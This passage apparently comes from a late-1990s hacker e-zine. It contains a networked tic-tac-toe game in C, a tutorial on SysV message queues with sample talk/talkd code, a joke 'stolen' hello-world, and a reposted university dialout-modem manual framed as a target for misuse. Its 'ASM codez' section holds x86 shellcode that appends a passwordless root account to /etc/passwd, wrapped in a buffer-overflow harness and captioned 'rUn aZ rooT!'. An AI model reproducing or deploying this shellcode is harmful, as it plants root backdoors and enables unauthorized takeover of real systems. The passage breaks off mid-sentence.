void initiate(unsigned long ip);      /* initiate a connection */
void wait_for_connection(void);       /* listen for a connection */
void usage(char *name);               /* -h */
void play_ttt(void);                  /* main ttt function */
void draw(void);                      /* draw the grid on the screen */
void x_input(void);                   /* input X value */
void o_input(void);                   /* input O value */
void x_plot(int x_coord);             /* update the grid */
void o_plot(int o_coord);
void sync_players(void);              /* synchronize players */
int continue_ttt(void);
int check(char xoro);                 /* check for winner */
void color_fix(int sig);              /* signal handler */
void reset_ttt(void);                 /* reset the ttt grid */

/* global socket descriptors BADBADBAD! */
int sockfd, newsockfd, sfd;

/* two dimensional array for phusttt grid */
char ttt[3][3] = {{'1','2','3'},{'4','5','6'},{'7','8','9'}};

/* player info struct */
struct players {
   char remote[10]; /* usernames */
   char local[10];
   int x_or_o; /* are we X or O? */
}player;

/* duh */
int main(int argc, char *argv[])
{
   int arg;
   int cont = 1;

   signal(SIGKILL, color_fix);
   signal(SIGINT, color_fix);

   if(argc < 2)
     usage(argv[0]);

   while((arg=getopt(argc, argv, "i:lh")) != EOF)
     {
        switch(arg)
          {
           case 'i':  /* initiate */
               {
                  printf("%splayername>%s%s ",BOLDWHITE,END,RED);
                  scanf("%9s", player.local);
                  initiate(getip(optarg));
                  while(cont == 1)
                    {
                       reset_ttt();
                       sync_players();
                       play_ttt();
                       cont = continue_ttt();
                    }
                  close(sockfd);
                  printf("%s", END);
                  exit(0);
               }
           case 'l':  /* listen */
               {
                  printf("%splayername>%s%s ",BOLDWHITE,END,RED);
                  scanf("%9s", player.local);
                  wait_for_connection();
                  while(cont == 1)
                    {
                       reset_ttt();
                       sync_players();
                       play_ttt();
                       cont = continue_ttt();
                    }
                  close(sockfd);
                  printf("%s", END);
                  exit(0);
               }
           case 'h':
               {
                  usage(argv[0]);
               }
           default:
               {
                  usage(argv[0]);
               }
          }
     }
   return(0);
}

unsigned long getip(char *hostname)
{
   struct hostent *he;
   if((he=gethostbyname(hostname)) == NULL) /* get that smaq */
     {
        herror("gethostbyname");
        printf("%s", END);
        exit(1);
     }
   return(inet_addr(inet_ntoa(*((struct in_addr *)he->h_addr)))); /* yuck. */
}

void usage(char *name)
{
   fprintf(stderr, "%s%sTCP/IP TIC TAC TOE by
phusnikn@usa.net%s\n",BGRED,BLUE,END);
   fprintf(stderr, "%susage: %s -l                 [ listen for a connection
]\n",BLUE, name);
   fprintf(stderr, "       %s -i < remote host > [ initiate a connection ]\n",
name);
   fprintf(stderr, "       %s -h                 [ help ]%s\n", name, END);
   exit(0);
}

void draw(void)
{
   (void)system("clear");
   printf("\n\n\n\n\n\n\n\n\n\n");
   printf("\t\t\t    %s%c%s บ %s %c %s บ
%s%c\n",BLUE,ttt[0][0],RED,BLUE,ttt[0][1],RED,BLUE,ttt[0][2]);
   printf("\t\t\t   %sอออฮอออออฮอออ%s\n",RED,END);
   printf("\t\t\t    %s%c%s บ %s %c %s บ
%s%c\n",BLUE,ttt[1][0],RED,BLUE,ttt[1][1],RED,BLUE,ttt[1][2]);
   printf("\t\t\t   %sอออฮอออออฮอออ%s\n", RED, END);
   printf("\t\t\t    %s%c%s บ %s %c %s บ
%s%c\n",BLUE,ttt[2][0],RED,BLUE,ttt[2][1],RED,BLUE,ttt[2][2]);
}

int continue_ttt(void)
{
   char c;
   printf("\n%s\t\t   Play another game? (y)es/(n)o:%s%s ",BOLDWHITE,END,RED);
   scanf("%1s", &c); /* PLEEZE SEY YES !@# */
   if(c == 'y' || c == 'Y')
     return(1);
   else
     return(0);
}

void reset_ttt(void)
{
   ttt[0][0] = '1'; /* OINK */
   ttt[0][1] = '2';
   ttt[0][2] = '3';
   ttt[1][0] = '4';
   ttt[1][1] = '5';
   ttt[1][2] = '6';
   ttt[2][0] = '7';
   ttt[2][1] = '8';
   ttt[2][2] = '9';
}

void initiate(unsigned long ip)
{
   struct sockaddr_in remote;

   player.x_or_o = X;  /* we are X */
   bzero(&remote, sizeof(struct sockaddr_in));
   remote.sin_family = AF_INET;
   remote.sin_port = htons(PORT);
   remote.sin_addr.s_addr = ip;

   if((sfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
        perror("socket");
        printf("%s", END);
        exit(1);
     }
   printf("%s%sWaiting for player...%s\n",END,BOLDWHITE,END);
   if(connect(sfd, (struct sockaddr *)&remote, sizeof(struct sockaddr)) == -1)
     {
        perror("connect");
        printf("%s", END);
        close(sfd);
        exit(1);
     }
   send(sfd, player.local, sizeof(player.local), 0);
   recv(sfd, player.remote, sizeof(player.remote), 0);
   printf("%s%sConnection established with%s%s %s [ %s]%s\n",
           END,BOLDWHITE,END,RED,player.remote,
           inet_ntoa(remote.sin_addr.s_addr),END);
   sleep(2);
}

void wait_for_connection(void)
{
   struct sockaddr_in remote;
   struct sockaddr_in local;
   int addrlen;

   player.x_or_o = O;  /* we are O */
   addrlen = sizeof(struct sockaddr_in);

   bzero(&remote, sizeof(struct sockaddr_in));
   bzero(&local, sizeof(struct sockaddr_in));
   local.sin_family = AF_INET;
   local.sin_port = htons(PORT);
   local.sin_addr.s_addr = INADDR_ANY;

   if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
        perror("socket");
        printf("%s", END);
        exit(1);
     }
   if(bind(sockfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1)
     {
        perror("bind");
        printf("%s", END);
        close(sockfd);
        exit(1);
     }
   if(listen(sockfd, 1) == -1)
     {
        perror("listen");
        printf("%s", END);

        close(sockfd);
        exit(1);
     }
   printf("%s%sWaiting for player...\n%s",END,BOLDWHITE,END);
   if((newsockfd=accept(sockfd, (struct sockaddr *)&remote, &addrlen)) == -1)
     {
        perror("accept");
        printf("%s", END);
        close(sockfd);
        exit(1);
     }
   sfd = newsockfd;
   recv(sfd, player.remote, sizeof(player.remote), 0);
   send(sfd, player.local, sizeof(player.local), 0);
   printf("%s%sConnection established with %s%s%s [ %s
]%s\n",END,BOLDWHITE,END,RED, player.remote
                                                  ,
inet_ntoa(remote.sin_addr.s_addr), END);
   sleep(2);
}

void x_input(void)
{
   int coord;
   if(player.x_or_o == O)
     {
        recv(sfd, &coord, sizeof(coord), 0);
        x_plot(coord);
        draw();
        return;
     }
   printf("\n");
   printf("\t\t\t    %s%sX>%s%s ",END,BOLDWHITE,END,RED);
   scanf("%d", &coord);   /* d0nt LOSE !@#$ */
   send(sfd, &coord, sizeof(coord), 0);
   x_plot(coord);
   draw();
   return;
}

void o_input(void)
{
   int coord;
   if(player.x_or_o == X)
     {
        recv(sfd, &coord, sizeof(coord), 0);
        o_plot(coord);
        draw();
        return;
     }
   printf("\n");

   printf("\t\t\t    %s%sO>%s%s ",END,BOLDWHITE,END,RED);
   scanf("%d", &coord);
   send(sfd, &coord, sizeof(coord), 0);
   o_plot(coord);
   draw();
   return;
}

void x_plot(int x_coord)
{
   switch(x_coord)
     {
      case 1:
        if(ttt[0][0] == 'o' || ttt[0][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[0][0] = 'x'; break;
      case 2:
        if(ttt[0][1] == 'o' || ttt[0][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[0][1] = 'x'; break;
      case 3:
        if(ttt[0][2] == 'o' || ttt[0][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[0][2] = 'x'; break;
      case 4:
        if(ttt[1][0] == 'o' || ttt[1][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[1][0] = 'x'; break;
      case 5:
        if(ttt[1][1] == 'o' || ttt[1][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[1][1] = 'x'; break;
      case 6:
        if(ttt[1][2] == 'o' || ttt[1][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[1][2] = 'x'; break;
      case 7:
        if(ttt[2][0] == 'o' || ttt[2][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[2][0] = 'x'; break;
      case 8:
        if(ttt[2][1] == 'o' || ttt[2][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
             else
          ttt[2][1] = 'x'; break;
      case 9:
        if(ttt[2][2] == 'o' || ttt[2][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, x_coord, END);
             x_input();
          }
        else
          ttt[2][2] = 'x'; break;
     }
}

void o_plot(int o_coord)
{
   switch(o_coord)
     {
      case 1:
        if(ttt[0][0] == 'o' || ttt[0][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[0][0] = 'o'; break;
      case 2:
        if(ttt[0][1] == 'o' || ttt[0][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[0][1] = 'o'; break;
      case 3:
        if(ttt[0][2] == 'o' || ttt[0][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[0][2] = 'o'; break;
      case 4:
        if(ttt[1][0] == 'o' || ttt[1][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[1][0] = 'o'; break;
      case 5:
        if(ttt[1][1] == 'o' || ttt[1][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[1][1] = 'o'; break;
      case 6:
        if(ttt[1][2] == 'o' || ttt[1][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[1][2] = 'o'; break;
      case 7:
        if(ttt[2][0] == 'o' || ttt[2][0] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[2][0] = 'o'; break;
      case 8:
        if(ttt[2][1] == 'o' || ttt[2][1] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[2][1] = 'o'; break;
      case 9:
        if(ttt[2][2] == 'o' || ttt[2][2] == 'x')
          {
             printf("%s\t\t\tLocation %d is occupied%s",
                    BOLDWHITE, o_coord, END);
             o_input();
          }
        else
          ttt[2][2] = 'o'; break;
     }
}

void sync_players(void)
{
char buf[7];

if(player.x_or_o == X)
  {
     send(sfd, "sync", 5, 0);
     recv(sfd, buf, sizeof(buf), 0);
     if(strcmp("synced", buf) != 0)
       {
          fprintf(stderr, "%sCouldn't sync!%s\n", BOLDWHITE, END);
          close(sfd);
          exit(1);
       }
  }
if(player.x_or_o == O)
  {
     recv(sfd, buf, sizeof(buf), 0);
     if(strcmp("sync", buf) != 0)
       {
          fprintf(stderr, "%sCouldn't sync!%s\n", BOLDWHITE, END);
          close(sfd);
          exit(1);
       }
     send(sfd, "synced", 7, 0);
  }
}

void play_ttt(void)
{
int c = 0;

draw();
for(;;)
  {
     x_input();
     if(check('x'))
       return;
     c++; /* heh */
     if(c==9)
       {
          return;
       }
     o_input();
     if(check('o'))
       return;
     c++; /* heh? */
     if(c==9)
       {
          return;
       }
  }
}

int check(char xoro)  /* sorta sounds like porno */
{
   int blah;

   if(xoro=='x')
     blah = X;
   if(xoro=='o')
     blah = O;

   if(ttt[0][0]==xoro && ttt[0][1]==xoro && ttt[0][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);  /* bewm */
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[1][0]==xoro && ttt[1][1]==xoro && ttt[1][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[2][0]==xoro && ttt[2][1]==xoro && ttt[2][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[0][0]==xoro && ttt[1][0]==xoro && ttt[2][0]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[0][1]==xoro && ttt[1][1]==xoro && ttt[2][1]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[0][2]==xoro && ttt[1][2]==xoro && ttt[2][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[0][0]==xoro && ttt[1][1]==xoro && ttt[2][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   if(ttt[2][0]==xoro && ttt[1][1]==xoro && ttt[0][2]==xoro)
     {
        if(player.x_or_o==blah)
          {
             printf("\n%s\t\t\t   YOU WIN %s%s\n",GREEN, player.local, END);
             return(1);
          }
        printf("\n%s\t\t\t   YOU LOSE %s%s\n",GREEN, player.local, END);
        return(1);
     }
   return(0);
}

void color_fix(int sig)
{
   printf("%s\n", END);
   close(sfd);
   exit(0);
}

!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 7 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0


                A QUICK AND DIRTY INTRO TO MESSAGE QUEUES

A message queue is a SySV IPC method. Like all IPC objects (methods, functions,
whatever) the message queue is used to communicate with other processes.


[Canul@/home/Canul/src/talkd/msgque 4:23pm]% man -k msg

msgctl (2)                  - message control operations
msgget (2)                  - get a message queue identifier
msgop (2)                   - message operations
recv, recvfrom, recvmsg (2) - receive a message from a socket
send, sendto, sendmsg (2)   - send a message from a socket
(END)

For you to make a message queue, just as in making a semaphore or a shared
memory segment, you need a project identifier. This can be done by using the
system call ftok.  Ftok needs a pathname to work.

SYNOPSIS
        #include <sys/types.h>
        #include <sys/ipc.h>
                key_t ftok (char *pathname, char proj)
RETURN VALUE
On success the return value will be the converted key_t value, otherwise -1
with errno.  Then you can use msgget to get the message identifier using the
key_ted valued returned from ftok.

SYNOPSIS
       #include <sys/types.h>
       #include <sys/ipc.h>
       #include <sys/msg.h>
                int msgget(key_t key, int msgflg)
RETURN VALUE
If successful, the return value will be the message queue identifier (a
nonnegative integer), otherwise -1 with errno indicating.

After you have the value of the message indentfier you can start sending and
receving from it with the use of msgsnd and msgrcv, you can also change its
permissions (perms) with msgctl.

SYNOPSIS
       #include <sys/types.h>
       #include <sys/ipc.h>
       #include <sys/msg.h>

                int msgsnd(int msqid, struct msgbuf *msgp", int msgsz,
                           int msgflg)

                int msgrcv(int msqid, struct msgbuf *msgp, int msgsz,
                           long msgtyp, int msgflg)

DESCRIPTION
To send or receive a message, the calling process allocates a structure that
looks like the following

          struct msgbuf {
              long mtype;     /* message type, must be > 0 */
              char mtext[1];  /* message data */
          };

msqid is the message identifier (the value that you should have gotten
from msgget). msgsz is the size of the msgbuf minus the mtype (in pesudo-code
long minus the sizeof msgbuf). Of course here msgbuf can be redefined,
e.g in a header file, but when you pass the redefined structure to the function
it must have the first element being a type long and the rest can be of any
format and you must cast that structure as msgbuf. msgflg, well this flag
you can usually leave to 0 but it is used for special requirements (try man
msgop). In msgrcv te msgtyp field is to indicate what message from the message
queue you would like to receive.  This will be decided by the message's
long mtype field, which always has to be positive number.

The system call msgctl can be used to remove the message identifier and
can also be used to change its perms.

SYNOPSIS
       #include <sys/types.h>
       #include <sys/ipc.h>
       #include <sys/msg.h>

                  int msgctl(int msqid, int  cmd, struct msqid_ds *buf)

cmd can be either IPC_STAT; returns information of the message queue back to
*buf, IPC_SET; changes the msgque (msg identifier) according to *buf, or
IPC_RMID; removes the message identifier.

[Canul@/usr/local/src/linux/include/linux 5:13pm]% more msg.h
#ifndef _LINUX_MSG_H
#define _LINUX_MSG_H

#include <linux/ipc.h>

/* ipcs ctl commands */
#define MSG_STAT 11
#define MSG_INFO 12

/* msgrcv options */
#define MSG_NOERROR     010000  /* no error if message is too big */
#define MSG_EXCEPT      020000  /* recv any msg except of specified type.*/

/* one msqid structure for each queue on the system */
struct msqid_ds {
        struct ipc_perm msg_perm;
        struct msg *msg_first;          /* first message on queue */
        struct msg *msg_last;           /* last message in queue */
        __kernel_time_t msg_stime;      /* last msgsnd time */
        __kernel_time_t msg_rtime;      /* last msgrcv time */
        __kernel_time_t msg_ctime;      /* last change time */
        struct wait_queue *wwait;
        struct wait_queue *rwait;
        unsigned short msg_cbytes;      /* current number of bytes on queue */
        unsigned short msg_qnum;        /* number of messages in queue */
        unsigned short msg_qbytes;      /* max number of bytes on queue */
        __kernel_ipc_pid_t msg_lspid;   /* pid of last msgsnd */
        __kernel_ipc_pid_t msg_lrpid;   /* last receive pid */
};
With this you already know what msqid_ds holds.

Here is some lame source that I wrote:

# Bold Teeth Makefile
CC= gcc
CFLAGS= -Wall -g -O2
ALL= talk talkd
all: ${ALL}
clean:
        rm -rf talk talkd *~
talk:
        ${CC} ${CFLAGS} -o talk talk.c
talkd:
        ${CC} ${CFLAGS} -o talkd talkd.c


/* talkd.h by Canul */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

#define VERSION "talkd v0.1 by Canul. canul7@yahoo.com"
#define PATHNAME "."
#define MAGICNUM 5400L
#define DATA_LIMIT 1024
#define TIME_TO_SLEEP 5

struct passwd  *checker;

struct pak
{
    long            header;
    char            data[DATA_LIMIT];
};

struct mymsgbuf
{
    long            mtype;
    struct pak      bata;
};

        int         msgsz = sizeof(struct mymsgbuf) - sizeof(long);


/*
 * $Id: talk.c,v 0.1 1999/1/10 17:53:21 Canul Exp $
 */

#include "talkd.h"

int             send_message(void);
int             get_message(void);
int             setup(void);
struct mymsgbuf *dmsg;

int             qid;
long            myqid;

void
main(void)
{
    char            opt;

    if (setup())
    {
        puts("there was an error setting up");
        exit(1);
    }
    printf("Press the letter \"s\" to send a message or \"g\" to wait for a
message.\n");
    opt = fgetc(stdin);
    switch (opt)
    {
    case 's':
        if (send_message())
        {
            puts("couldn't send the message");
            exit(1);
        }
        break;
    case 'g':
        if (get_message())
        {
            puts("couldn't receive message");
            exit(1);
        }
        break;
    default:
        printf("%c unrecognized option\n", opt);
        break;
    }
}

int
setup(void)
{
    key_t           key;

    if ((key = ftok(PATHNAME, 'a')) == -1)
        return 1;
    if ((qid = msgget(key, IPC_NOWAIT)) == -1)
        return 1;
    return 0;
}

int
send_message(void)
{
    int             i,
                    d;
    char           *p;
    dmsg = (struct mymsgbuf *) malloc(sizeof(struct mymsgbuf));
    dmsg->mtype = MAGICNUM;
    printf("enter long: ");
    scanf("%d", &d);
    dmsg->bata.header = (long *) d;
    printf("%ld is the header type\n", dmsg->bata.header);
    p = dmsg->bata.data;
    printf("Enter message: ");

    for (i = 0; i < DATA_LIMIT - 1; i++)
    {
        if ((*p = fgetc(stdin)) == EOF)
            break;
        p++;
    }
    *p = '\0';
    printf("\nSending message to resource %d\n", qid);
    if (msgsnd(qid, (struct msgbuf *) dmsg, msgsz, 0) == -1)
    {
        perror("msgsnd");
        return (1);
    }
    free(dmsg);
    return 0;
}

int
get_message(void)
{
    int             d;
    dmsg = (struct mymsgbuf *) malloc(sizeof(struct mymsgbuf));
    printf("enter message type: ");
    scanf("%d", &d);
    dmsg->bata.header = (long *) d;

    if ((msgrcv(qid, (struct msgbuf *) dmsg, msgsz, myqid, 0)) == -1)
    {
        perror("msgrcv");
        return 1;
    }

    printf("Received: %s\n", dmsg->bata.data);
    free(dmsg);
    return 0;
}

/*
 * talkd.c this code is self-explanitory. (I hope)
 */

#include "talkd.h"
#define LOG_PATH "log"

int             qid;

struct mymsgbuf *msgp;

void            signalhandler(int a);

void
main(int argc, char **argv)
{
    pid_t           daemon;
    key_t           key;
    FILE           *fp;
    fp = fopen(LOG_PATH, "a");
    msgp = (struct mymsgbuf *) malloc(sizeof(struct mymsgbuf));
    signal(SIGTERM, signalhandler);
    puts(VERSION);

    if ((key = ftok(PATHNAME, 'a')) == -1)
    {
        perror("stat");
        exit(1);
    }
    if ((qid = msgget(key, IPC_CREAT | 0660)) == -1)
    {
        perror("mesgget");
        exit(1);
    }
    if ((daemon = fork()) == -1)
    {
        perror("fork");
        exit(1);
    }
    if (daemon)
    {
        exit(0);
    }
    setsid();

    if ((daemon = fork()) == -1)
    {
        perror("fork");
        exit(1);
    }
    else if (daemon)
        exit(0);
    /*
     * kill that parent!
     */

    while (1)
    {
        if ((msgrcv(qid, (struct msgbuf *) msgp, msgsz, MAGICNUM, 0)) != -1)
        {
            msgp->mtype = msgp->bata.header;
            fprintf(fp, "server: msg to %d with mtype %ld\n", qid, msgp->mtype);
            if (msgsnd(qid, (struct msgbuf *) msgp, msgsz, 0) == -1)
            {
                perror("msgsnd");
                exit(1);
                /*
                 * do whatever
                 */
            }
        }
        else
        {
            perror("msgrcv");
            exit(1);
        }
    }
}
void
signalhandler(int a)
{
    printf("caught ^C\n");
    if ((msgctl(qid, IPC_RMID, NULL)) == -1)
    {
        perror("msgctl");
        exit(1);
    }
}


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 8 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b

/* B4B0 Linux x86 ASM Codez, by chrak */

#include
#include
#include

codez()
{
__asm__("
xorl %eax, %eax
xorl %ebx, %ebx
xorl %ecx, %ecx
xorl %edx, %edx

movb $5, %al           # SYS_open
movl $passwd, %ebx     # ebx ptr to passwd
incb %cl               # 1 = O_WRONLY
int $0x80

movl %eax, %ebx        # fd
xorl %eax, %eax
movb $19, %al          # SYS_lseek
decb %cl               # offset = 0
movb $2, %dl           # SEEK_END
int $0x80

xor %eax, %eax
movb $4, %al           # SYS_write
movl $entry, %ecx      # ecx ptr to entry
movb $30, %dl          # count = 30
int $0x80

xor %eax, %eax
movb $1, %al
int $0x80              # gotta fix later

entry:
.ascii \"b4b0::0:0:Fatima:/usr:/bin/sh\\n\"
passwd:
.string \"/etc/passwd\"
");
}


char large_string[128];


void main()
{
char *shellcode= (char *)codez;

  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];
  strcpy(buffer,large_string);
}

/* rUn aZ rooT! */


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 9 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b

                             Stolen ISS Warez
                                Anonymous

/*
 * Copyright (C) 1991 ISS, Inc.
 *     All Rights Reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ISS
 * The copyright notice above does not evidence any
 * actual or intended publication of such source code.
 *
 * This code can be very dangerous if put in the wrong hands.
 * Do not distribute.
 *
 */

#include <stdio.h>

int main(void)
{
    printf("Hello World");
    return;
}


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 10 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b

=-= Idiocy on Dialouts / Dialout Info, by jorge =-=

Hi. Everyone really loves dialouts. How do a lot of people find them? scanning,
mostly. But its funny. You type in "Dialout" on a search engine and the possi-
bilities are almost endless. Check it. This is that PSU dialout everyone and
their biological mothers know about.


this peice of information contains a lot of helpful stuff, take notes!

                     THE PENNSYLVANIA STATE UNIVERSITY
                        OFFICE OF TELECOMMUNICATIONS

                           OPERATING INSTRUCTIONS
                                    for

                              DIALOUT.PSU.EDU

                                Version 1.1
                                July 6, 1993
                               U.Ed. OTC 96-3
                      HTML conversion: August 29, 1995

     _________________________________________________________________

   Acknowledgments:
     * Compiled and written by: John Balogh
     * Content corrections by: Steve Schroeder, Mark Paige
     * Editorial comments and corrections by: Margaret Gearhart, Peter
       Weiss

     _________________________________________________________________

   Table of Contents
    1. Introduction
         1. Purpose of this Document
         2. Intended Use
         3. Billing
    2. Capabilities
         1. Terminal Emulation
    3. Use
         1. Connecting with TELNET
         2. "AT" Dialing
         3. Trouble
    4. Advanced Features
         1. Long Distance Billing ("Toll")
         2. Required Forms
         3. Security Considerations
    5. Availability
         1. Initial Capacity
         2. Future Service Expansion
         3. Documentation On-line

     * References
     * Glossary
     * Appendices
         1. "AT" Command Set
         2. Example DIALOUT Sessions
               o "Local" (Tymnet)
               o "800"
               o "Toll Call"
         3. Frequently Called Numbers
         4. Authorization Code Implementation
               o Purpose
               o Terminology
               o Procedure
               o Discontinuing Use of Long Distance Authorization Codes
         5. Long Distance Auth Code Data Collection Form

     _________________________________________________________________

  Introduction

       DIALOUT.PSU.EDU is a service available on Penn State's Data
       Backbone [3] that allows a backbone user to originate a connection
       to modem-accessible computers which are not otherwise available on
       the backbone. The service allows modem calls that are local to the
       University Park area and calls that attach to toll-free "800"
       numbers. To place modem calls that will incur a long-distance
       (toll) charge, authorizing forms (described in section 4 of this
       document) must be completed first, or a credit-card dialing method
       must be used.

    Purpose of this Document
            The purpose of this document is to describe the use of
            DIALOUT.PSU.EDU (DIALOUT) on the Penn State Data Backbone to
            access services that are presently available only to modem
            users. It will discuss the capabilities, use of DIALOUT,
            access to advanced features and availability.

    Intended Use
            As is stated in other Office of Telecommunications (OTC)
            write-ups (V.32 User Guide [1], Serial Line Internet Protocol
            Overview [2]), many users of data processing equipment have
            experienced a need for "phone line" connections to other
            computing equipment. A typical case is a user who needs to
            connect to services on the Penn State Data Backbone, but is
            not physically located at one of the campuses. The logical
            solution is an autodial modem. A modem is used to call from
            the user's site to the nearest convenient modem that is
            connected to the public access network for the Penn State
            Data Backbone and establish a terminal session.
            However, if the user is already connected to the backbone and
            wishes to communicate with a service such as a Bulletin Board
            System (BBS) that is not accessible via the backbone, then
            considerations of modems, phone lines and phone line charges
            again come to mind.
            The solution is now available without the need for additional
            hardware or monthly charges in the DIALOUT service.
            This service is intended for the user on the data backbone
            who needs occasional accessto a local bulletin board or one
            of the timesharing services such as Compuserve or Telenet. It
            is also available for the user who needs to dial out to a
            host which is not within the University Park local calling
            area if the call can be billed to their Penn State budget and
            fund number.

    Billing
            If a backbone user wishes to connect with a dial-in service
            that would incur a toll call charge, they must complete some
            forms and obtain signatures to authorize that use of the
            service. This process will be described in section 4.2 later
            in this document. DIALOUT is not a free way to make long
            distance modem connections.

  Capabilities

       The DIALOUT modem ports are set to 38,400 bps and the modems are
       capable of V.32bis, V.32, V.42bis, V.42, MNP5 and all subset
       standards of these protocols (examples include Bell 103 and
       V.22bis). If the service that is dialed runs at a lower speed, the
       communications path will take care of the mismatch in speed.

    Terminal Emulation
            The link from the Penn State Data Backbone to the DIALOUT
            modem ports utilizes a terminal server. The supported
            terminal emulation is VT100. This emulation may imply some
            restrictions on the types of services to which a successful
            connection can be established. In general, if the service can
            be utilized from a VT100 terminal, it can also be utilized
            from the backbone, through the DIALOUT service.

  Use

       The service can be accessed with a TELNET command to connect to
       the DIALOUT.PSU.EDU service. Once accessed, the modem is able to
       understand commands given to it in the "AT" command set, and a
       call can be placed.

    Connecting with TELNET
            Access to the TELNET function varies from computer to
            computer. In general, the method would be to start a TELNET
            session as you would with any other host, but specify DIALOUT
            for the host name. If you have trouble connecting with just
            the name, try adding the domain; for example,
            DIALOUT.PSU.EDU. Further details on access are in the section
            "Availability," later in this document.

    "AT" Dialing
            The DIALOUT service modem pool understands the Hayes "AT"
            dialing command set. A list of available AT commands is
            listed in Appendix 1 at the end of this document.
            Once connected to DIALOUT, type the three characters:


                      "a", "t" and "return".


            It does not matter if they are typed in upper or lower case.
            The modem should reply with the message "OK" thus:

    at        <--- typed by the user on the DTE's keyboard
    OK        <--- typed by the modem


                      Note that all messages that have the comment "typed
                      by the user" are followed by the "RETURN" or
                      "ENTER" key on the keyboard. Those messages that
                      have the comment "typed by the modem" are sent from
                      the modem to the user's screen; the user does NOT
                      type them. This applies to all the examples that
                      follow in this document.

            Full examples are included at the end of this document in
            Appendix 1.

    Trouble
            If the connection to DIALOUT is not completed, all the lines
            may be in use or something may be broken; try again after a
